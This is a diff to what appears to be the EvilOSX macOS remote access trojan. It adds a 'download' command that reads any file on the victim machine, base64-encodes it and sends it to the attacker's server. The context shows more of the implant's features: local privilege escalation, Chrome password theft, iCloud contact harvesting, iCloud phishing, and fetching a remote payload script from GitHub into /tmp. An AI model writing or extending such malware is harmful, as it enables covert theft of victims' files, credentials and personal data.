@@ -210,6 +210,7 @@ def get_help():
     help += "connect <ID>      -  Connect to the client.\n"
     help += "get_info          -  Show basic information about the client.\n"
     help += "get_root          -  Attempt to get root via local privilege escalation.\n"
+    help += "download <path>   -  Downloads the file to the local machine.\n"
     help += "chrome_passwords  -  Retrieve Chrome passwords.\n"
     help += "icloud_contacts   -  Retrieve iCloud contacts.\n"
     help += "icloud_phish      -  Attempt to get iCloud password via phishing.\n"
@@ -408,6 +409,19 @@ def start_server():
                         response += MESSAGE_INFO + "FileVault is off."
 
                     send_response(server_socket, response)
+                elif command.startswith("download"):
+                    file_path = command.split(" ")[1]
+
+                    if not os.path.isfile(file_path):
+                        send_response(server_socket, MESSAGE_ATTENTION + "Failed to download: File doesn't exist!")
+                    else:
+                        with open(os.path.realpath(file_path), "r") as open_file:
+                            encoded_file = base64.b64encode(open_file.read())
+
+                            if not encoded_file:
+                                send_response(server_socket, MESSAGE_ATTENTION + "Failed to download: Empty file.")
+                            else:
+                                send_response(server_socket, encoded_file)
                 elif command == "chrome_passwords":
                     payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/master/Payloads/chrome_passwords.py"
                     payload_file = "/tmp/chrome_passwords.py"
